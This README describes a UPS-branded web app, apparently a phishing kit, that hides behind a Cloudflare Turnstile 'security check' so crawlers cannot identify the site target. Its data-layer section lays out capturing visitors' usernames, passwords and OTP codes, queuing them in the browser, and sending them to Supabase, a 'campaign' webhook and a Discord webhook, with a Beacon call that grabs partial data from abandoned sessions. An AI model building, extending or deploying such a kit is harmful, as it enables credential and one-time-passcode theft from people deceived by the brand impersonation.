# UPS Stealth Gateway

A high-security, brand-consistent "Stealth" landing page designed to filter bot traffic before allowing access to the main application.

## 🛡️ Security Architecture
This project uses a **Zero-Trust** architecture with 3 protective layers:

1.  **Frontend Challenge (Landing Page)**:
    -   A minimalist "Stealth" page (`/`) presented as a generic "Security Check".
    -   Uses **Cloudflare Turnstile** to challenge incoming traffic.
    -   **Stealth Design**: No navigation, no footer links, and generic metadata ("Security Check") to avoid scrapers identifying the site target.

2.  **Edge Verification (Proxy)**:
    -   **Tech**: Next.js 16 `proxy.ts` (replaces deprecated middleware).
    -   **Logic**: Intercepts **ALL** navigation to protected routes (`/login`, `/verify`, `/success`).
    -   **Enforcement**: Checks for the **HTTP-Only** `cf_verified` cookie. If missing, forces redirect to `/`.

3.  **Strict Session Management**:
    -   Upon any **failed** Turnstile verification, the API (`api/verify-challenge`) **immediately deletes** the `cf_verified` cookie.
    -   This prevents bypass attempts using stale sessions.

## 🚀 Getting Started

### Prerequisites
-   Node.js 18+
-   pnpm

### Installation
1.  Clone the repository.
2.  Install dependencies:
    ```bash
    pnpm install
    ```
3.  **Environment Setup**:
    -   Copy `.env.example` to `.env.local`
    -   Review the keys in `.env.example`. By default, it uses the **"Always Pass"** dummy keys for easy development.

### Running Development Server
```bash
pnpm dev
```
Access the site at `http://localhost:3000`.

## 🧪 Testing & Robustness
We use Cloudflare's official **Testing Keys** to simulate different traffic scenarios.

To test these scenarios, update `NEXT_PUBLIC_TURNSTILE_SITE_KEY` in `.env.local` with the keys below (see `.env.example` for full list).

| Scenario | Behavior | Test Outcome |
| :--- | :--- | :--- |
| **Always Pass** | Simulates a clean human user. | Widget verifies -> User redirected to `/login`. |
| **Always Block** | Simulates a bot/crawler. | Widget fails -> User **blocked** from accessing `/login`. |
| **Force Challenge** | Simulates suspicious traffic. | Widget demands interaction (click/puzzle) -> Redirects on success. |

### Keys Reference
-   **Pass**: `1x00000000000000000000AA`
-   **Block**: `2x00000000000000000000AB`
-   **Challenge**: `3x00000000000000000000FF`

## 📂 Project Structure
-   `src/app/page.tsx`: The "Stealth" landing page. Minimalist, branded, secure.
-   `src/proxy.ts`: **CRITICAL**. The security gatekeeper. Renamed from `middleware.ts` for Next.js 16 compatibility.
-   `src/app/api/verify-challenge/route.ts`: Backend verification logic. Handles cookie creation/destruction.

## 📊 Data Layer & Telemetry
The application uses a specific **"Single Row Architecture"** to ensure data integrity and zero loss.

### Architecture: Accumulate & Sync
Instead of sending partial data fragments, the application accumulates user data locally (`localStorage`) as they progress through the funnel (Login -> Verify).
-   **Step 1 (Login)**: Captures Username/Password. Saves to local session. **No transmission**.
-   **Step 2 (Verify)**: Captures OTP/Interaction. Merges with session.
-   **Trigger**: Upon successful "Verify" submission (or Page Abandonment), the **Complete Record** is constructed and sent.

### Destinations (The 3-Way Sync)
Data is simultaneously synchronized to 3 locations:

1.  **Supabase Database** (`DB_WEBHOOK_URL`):
    -   Receives the **Clean Payload**.
    -   Structured JSON with distinct `business`, `meta`, and `device` sections.
    -   Primary source of truth for persistent records.

2.  **Campaign System** (`CAMPAIGN_WEBHOOK_URL`):
    -   Receives **Lead Data** only.
    -   Extracts Name, Email, Phone, and Address to sync with external CRM/Campaign tools.

3.  **Discord** (`DISCORD_WEBHOOK_URL`):
    -   Receives **Notifications**.
    -   Real-time alerts with a JSON embed of the event for immediate monitoring.

### Zero-Loss Guarantee
-   **Queueing**: All events are first saved to `IndexedDB`.
-   **Retry Logic**: Failed requests are retried automatically.
-   **Beacon**: If a user closes the tab before finishing, an `abandoned_session` event is fired via the Beacon API to capture partial data.

